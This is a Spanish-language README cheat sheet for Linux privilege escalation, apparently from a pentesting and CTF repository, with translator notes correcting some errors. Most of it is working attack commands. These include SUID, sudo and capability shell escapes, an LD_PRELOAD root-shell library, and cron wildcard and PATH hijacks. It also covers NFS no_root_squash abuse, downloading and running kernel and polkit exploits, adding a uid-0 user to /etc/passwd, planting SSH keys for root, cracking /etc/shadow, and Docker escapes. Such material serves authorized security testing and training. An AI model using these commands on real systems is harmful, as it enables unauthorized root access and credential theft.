# 🐧 Escalada de privilegios en Linux: guía de consulta completa

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-PrivEsc-red?style=for-the-badge" alt="Linux PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Postexplotación">
  <img src="https://img.shields.io/badge/Root-Access-blue?style=for-the-badge" alt="Root">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Guía completa de escalada de privilegios en sistemas Linux</b>
</p>

---

## 📋 Índice

- [Enumeración](#-enumeración)
- [SUID/SGID](#-suidsgid)
- [Capacidades](#-capacidades)
- [Explotación de sudo](#-explotación-de-sudo)
- [Tareas de cron](#-tareas-de-cron)
- [Secuestro de PATH](#-secuestro-de-path)
- [Root squashing en NFS](#-root-squashing-en-nfs)
- [Exploits del kernel](#-exploits-del-kernel)
- [Búsqueda de contraseñas](#-búsqueda-de-contraseñas)
- [Claves SSH](#-claves-ssh)
- [Archivos con permiso de escritura](#-archivos-con-permiso-de-escritura)
- [Escape de Docker](#-escape-de-docker)
- [Referencia rápida](#-referencia-rápida)

---

## 🔍 Enumeración

### Información del sistema

```bash
# Nombre del equipo
hostname

# Sistema operativo y kernel
cat /etc/os-release
cat /etc/issue
uname -a
uname -r

# Arquitectura
arch
uname -m

# Información de la CPU
cat /proc/cpuinfo
lscpu
```

### Información de usuarios

```bash
# Usuario actual
whoami
id

# Todos los usuarios
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false"

# Grupos de usuarios
groups
cat /etc/group

# Usuarios con sesión iniciada
w
who
users

# Últimos inicios de sesión
last
lastlog

# Privilegios de sudo
sudo -l
```

### Información de red

```bash
# Direcciones IP
ip a
ifconfig

# Rutas
ip route
route -n

# Puertos abiertos
netstat -tulpn
ss -tulpn

# Conexiones activas
netstat -an
ss -an

# Caché ARP
arp -a
ip neigh

# DNS
cat /etc/resolv.conf

# Equipos
cat /etc/hosts
```

### Procesos y servicios

```bash
# Procesos en ejecución
ps aux
ps -ef
ps aux | grep root

# Servicios
systemctl list-units --type=service
service --status-all

# Paquetes instalados
dpkg -l                    # Debian/Ubuntu
rpm -qa                    # RHEL/CentOS
```

### Tareas programadas

```bash
# Tablas de cron
crontab -l
ls -la /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*

# Temporizadores de systemd
systemctl list-timers
```

---

## 🔐 SUID/SGID

> **Aclaración:** SUID y SGID establecen el UID o GID efectivo del propietario del archivo. La explotación depende del binario, de si conserva los privilegios y de opciones de montaje como `nosuid`; las shells pueden descartarlos. Linux no aplica el bit SUID a los scripts interpretados como a los binarios ejecutables. Véase el [manual de execve](https://man7.org/linux/man-pages/man2/execve.2.html).

### Buscar binarios SUID

```bash
# Buscar archivos SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Buscar archivos SGID
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Buscar ambos tipos
find / -perm /6000 -type f 2>/dev/null
```

### Binarios SUID habituales que pueden explotarse

Consulta [GTFOBins](https://gtfobins.github.io/) para conocer los métodos de explotación.

#### **bash**
```bash
# Si bash tiene el bit SUID activado
./bash -p
```

#### **find**
```bash
find . -exec /bin/sh -p \; -quit
```

#### **vim**
```bash
vim -c ':!/bin/sh'
```

#### **nmap** (versiones antiguas)

> **Compatibilidad:** El modo `--interactive` es histórico y no está disponible en las versiones actuales de Nmap. Se conserva el ejemplo original; consulta el [registro oficial de cambios](https://nmap.org/changelog).
```bash
nmap --interactive
!sh
```

#### **python**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

#### **perl**
```bash
perl -e 'exec "/bin/sh";'
```

#### **less/more**
```bash
less /etc/passwd
!/bin/sh
```

#### **cp**

> **Aclaración del ejemplo original:** La sustitución `$(openssl passwd -1 password)` está entre comillas simples y, por tanto, no se evalúa. Además, `/tmp/passwd` no se inicializa con una copia del archivo original. Este bloque se conserva literalmente y no constituye una secuencia funcional tal como está escrito.
```bash
# Copiar /etc/passwd, añadir un usuario root y copiar de nuevo
LFILE=/etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd $LFILE
```

#### **env**
```bash
env /bin/sh -p
```

---

## ⚡ Capacidades

> **Aclaración:** Las *capabilities* dividen los privilegios de root en permisos concretos. `CAP_NET_RAW` permite sockets raw y de paquetes; no equivale por sí sola a obtener root. Véase el [manual de capacidades de Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html).

### Buscar capacidades

```bash
# Consultar las capacidades de los archivos
getcap -r / 2>/dev/null

# Capacidades peligrosas habituales
# CAP_SETUID - Cambiar el UID
# CAP_NET_RAW - Sockets sin procesar (raw sockets)
# CAP_DAC_READ_SEARCH - Leer cualquier archivo
```

### Explotar capacidades

#### **Python (cap_setuid)**
```bash
# Si python tiene cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### **Perl (cap_setuid)**
```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

#### **tar (cap_dac_read_search)**
```bash
# Leer cualquier archivo
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

#### **vim (cap_setuid)**
```bash
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

## 🔑 Explotación de sudo

### Comprobar los permisos de sudo

```bash
sudo -l
# Buscar entradas NOPASSWD
# Buscar entradas (ALL) o (root)
```

### Explotar sudo

#### **sudo ALL**
```bash
sudo /bin/bash
sudo su
```

#### **LD_PRELOAD**
```bash
# Si aparece env_keep+=LD_PRELOAD en sudo -l
# Crear una biblioteca maliciosa

cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/any_allowed_program
```

#### **sudo vim**
```bash
sudo vim -c ':!/bin/sh'
```

#### **sudo less/more**
```bash
sudo less /etc/passwd
!/bin/sh
```

#### **sudo find**
```bash
sudo find /tmp -exec /bin/sh \;
```

#### **sudo nmap** (modo interactivo)
```bash
sudo nmap --interactive
!sh
```

#### **sudo tar**
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### **sudo zip**
```bash
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

#### **sudo env**
```bash
sudo env /bin/sh
```

#### **sudo awk**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### **sudo man**
```bash
sudo man man
!/bin/sh
```

#### **sudo apache2**
```bash
sudo apache2 -f /etc/shadow
# Revela la primera línea de shadow
```

### Exploits según la versión de sudo

> **Aclaración:** La aplicabilidad depende de la versión real del paquete y de los parches de la distribución. CVE-2021-3156 afecta a sudo 1.8.2–1.8.31p2 y 1.9.0–1.9.5p1; la línea mostrada es un desencadenante de prueba, no un exploit completo para obtener root. Véase el [aviso original de Qualys](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt).

```bash
# Consultar la versión
sudo --version

# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit)
# sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

---

## ⏰ Tareas de cron

### Buscar tareas de cron

```bash
# Tabla de cron del sistema
cat /etc/crontab

# Directorios de cron
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Tablas de cron de usuarios
cat /var/spool/cron/crontabs/*

# Observar la actividad de cron
# Utilizar pspy para supervisar procesos
```

### Explotar tareas de cron

#### **Script de cron con permiso de escritura**
```bash
# Si cron ejecuta un script que puedes modificar:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh

# Esperar a que se ejecute cron y después:
/tmp/bash -p
```

#### **Inyección mediante comodines (tar)**
```bash
# Si cron ejecuta: tar czf /tmp/backup.tar.gz *

# Crear archivos maliciosos
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

#### **Explotación de PATH**
```bash
# Si cron usa una ruta relativa y controlas PATH
# La tabla de cron muestra: PATH=/home/user:/usr/local/bin:...
# El script invoca: backup.sh (sin la ruta completa)

# Crear un script falso en un directorio de PATH en el que puedas escribir
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/backup.sh
chmod +x /home/user/backup.sh
```

---

<a id="-secuestro-de-path"></a>
## 🛤️ Secuestro de PATH

### Buscar scripts vulnerables

```bash
# Buscar scripts ejecutados por root que utilicen rutas relativas
# Comprobar scripts SUID
# Comprobar scripts de cron
# Comprobar servicios de systemd
```

### Explotar PATH

```bash
# Si el script de root invoca 'service' sin la ruta completa
# y controlas PATH:

# Crear un 'service' malicioso
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH

# Ejecutar el script vulnerable
./vulnerable_script
```

---

## 📁 Root squashing en NFS

> **Aclaración:** *Root squashing* asigna las solicitudes con UID/GID 0 de un cliente NFS a la identidad anónima; `no_root_squash` desactiva esta protección. El ejemplo requiere escritura en el recurso y que el servidor permita conservar y utilizar SUID. Véase el [manual de exports](https://man7.org/linux/man-pages/man5/exports.5.html).

### Buscar recursos compartidos NFS

```bash
# En el equipo del atacante
showmount -e target_ip

# Comprobar los recursos exportados
cat /etc/exports
# Buscar no_root_squash
```

### Explotar no_root_squash

```bash
# En el equipo del atacante (como root):
mkdir /tmp/nfs
mount -o rw target_ip:/share /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# En el objetivo:
/share/bash -p
```

---

## 💣 Exploits del kernel

### Consultar la versión del kernel

```bash
uname -r
uname -a
cat /proc/version
```

### Exploits habituales del kernel

> **Corrección de la clasificación original:** PwnKit afecta a `pkexec` de polkit y Baron Samedit a sudo: son vulnerabilidades de espacio de usuario, no del kernel. Los rangos de la tabla son orientativos y no incluyen todos los parches de distribución. Dirty Pipe se corrigió en Linux 5.16.11, 5.15.25 y 5.10.102; 5.16.11 no es una versión vulnerable en esa rama. Fuentes: [aviso original de PwnKit](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) e [informe original de Dirty Pipe](https://dirtypipe.cm4all.com/).

| CVE | Versión del kernel | Nombre |
|-----|----------------|------|
| CVE-2016-5195 | 2.x - 4.8.3 | **Dirty COW** |
| CVE-2021-4034 | Todas | **PwnKit** |
| CVE-2021-3156 | sudo < 1.9.5p2 | **Baron Samedit** |
| CVE-2022-0847 | 5.8 - 5.16.11 | **Dirty Pipe** |
| CVE-2022-2588 | 5.x | **DirtyCred** |

### Dirty COW (CVE-2016-5195)

> **Aclaración del ejemplo original:** La descarga guarda normalmente el archivo como `40839`, mientras que la compilación hace referencia a `40839.c`; ambos nombres deben corresponder. Las órdenes originales se mantienen sin cambios.
```bash
# Descargar y compilar
wget https://www.exploit-db.com/download/40839
gcc -pthread 40839.c -o dirty -lcrypt
./dirty
```

### PwnKit (CVE-2021-4034)
```bash
# Descargar
git clone https://github.com/ly4k/PwnKit
cd PwnKit
chmod +x PwnKit
./PwnKit
```

### Dirty Pipe (CVE-2022-0847)
```bash
# Comprobar primero la versión del kernel
uname -r

# Descargar y compilar
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
./exploit-1
```

---

## 🔑 Búsqueda de contraseñas

### Buscar contraseñas

```bash
# En archivos
grep -r "password" /home/ 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null

# Archivos de configuración
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
cat /etc/mysql/my.cnf

# Archivos de historial
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history

# Entorno
env
printenv
```

### Archivos de contraseñas

```bash
# Archivo shadow (requiere root)
cat /etc/shadow

# Hashes de contraseñas de shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

### Ubicaciones habituales

```bash
# Configuración web
/var/www/html/wp-config.php
/var/www/html/config.php
/var/www/html/.htpasswd

# Configuración de bases de datos
/etc/mysql/my.cnf
/etc/postgresql/*/main/pg_hba.conf

# SSH
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa

# Copias de seguridad
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
```

---

## 🔐 Claves SSH

### Buscar claves SSH

```bash
# Claves privadas
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Claves autorizadas
cat /home/*/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```

### Aprovechar claves SSH

```bash
# Si encuentras una clave privada que puedas leer:
chmod 600 id_rsa
ssh -i id_rsa user@localhost
ssh -i id_rsa root@localhost
```

### Añadir tu clave SSH

```bash
# Generar una clave en el equipo del atacante
ssh-keygen -t rsa -b 4096

# Si puedes escribir en authorized_keys:
echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
echo "YOUR_PUBLIC_KEY" >> /home/user/.ssh/authorized_keys
```

---

## 📝 Archivos con permiso de escritura

### Archivos críticos con permiso de escritura

```bash
# Comprobar los permisos de escritura
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
```

### Aprovechar un /etc/passwd con permiso de escritura

```bash
# Generar el hash de la contraseña
openssl passwd -1 -salt hacker password
# Resultado: $1$hacker$TzyKlv0/R/c28R.GAeLw.1

# Añadir un usuario root
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0::/root:/bin/bash' >> /etc/passwd

# Iniciar sesión
su hacker
# Contraseña: password
```

### Buscar archivos en los que todos puedan escribir

> **Aclaración:** `-writable` comprueba si el usuario actual puede escribir; no significa que todos puedan hacerlo. `-perm -222` exige los bits de escritura para propietario, grupo y otros simultáneamente, mientras que `-perm -o+w` comprueba el de otros usuarios. Se mantienen las búsquedas originales.

```bash
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null

# Directorios en los que todos puedan escribir
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
```

---

## 🐳 Escape de Docker

### Comprobar si estás dentro de Docker

> **Aclaración:** El nombre del equipo, `/.dockerenv` y las entradas de cgroups son indicios que dependen de la configuración; su presencia o ausencia no identifica de forma concluyente un contenedor. Los ejemplos de escape requieren acceso al socket o a dispositivos del anfitrión y los permisos correspondientes.

```bash
# Buscar .dockerenv
ls -la /.dockerenv

# Comprobar los cgroups
cat /proc/1/cgroup | grep docker

# Comprobar el nombre del equipo (cadena aleatoria)
hostname
```

### Montaje del socket de Docker

```bash
# Si docker.sock está montado
find / -name docker.sock 2>/dev/null
ls -la /var/run/docker.sock

# Escapar mediante el socket de Docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Contenedor privilegiado

```bash
# Si el contenedor es privilegiado
fdisk -l                    # Ver los discos del equipo anfitrión
mount /dev/sda1 /mnt
chroot /mnt
```

---

## 📊 Referencia rápida

### Enumeración con comandos de una línea

```bash
# Información rápida del sistema
id; hostname; uname -a; cat /etc/issue

# Comprobación rápida de SUID
find / -perm -4000 -type f 2>/dev/null

# Consulta rápida de capacidades
getcap -r / 2>/dev/null

# Consulta rápida de sudo
sudo -l

# Consulta rápida de cron
cat /etc/crontab; ls -la /etc/cron*

# Búsqueda rápida de contraseñas
grep -r "password" /home/ 2>/dev/null
```

### Herramientas automatizadas

| Herramienta | Descripción |
|------|-------------|
| **LinPEAS** | Enumeración exhaustiva |
| **LinEnum** | Enumeración de Linux |
| **linux-smart-enumeration** | LSE |
| **pspy** | Monitor de procesos |

### Lista de comprobación de hallazgos rápidos

- [ ] `sudo -l` - Comprobar los permisos de sudo
- [ ] Binarios SUID: buscarlos y consultar GTFOBins
- [ ] Capacidades - `getcap -r / 2>/dev/null`
- [ ] Tareas de cron: ¿hay scripts que puedas modificar?
- [ ] Versión del kernel: ¿existen exploits conocidos?
- [ ] /etc/shadow con permiso de lectura
- [ ] /etc/passwd con permiso de escritura
- [ ] Claves SSH en /home/* o /root
- [ ] Socket de Docker montado
- [ ] NFS con no_root_squash

---

## 📚 Recursos

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsTodasTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

### Guías de consulta relacionadas
- [LinPEAS: proyecto oficial](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [Escalada de privilegios en Windows](../../Windows-PrivEsc/translations/README.es.md)

---

<p align="center">
  <b>🐧 ¡Obtén acceso root!</b><br>
  <i>Domina la escalada de privilegios en Linux</i>
</p>
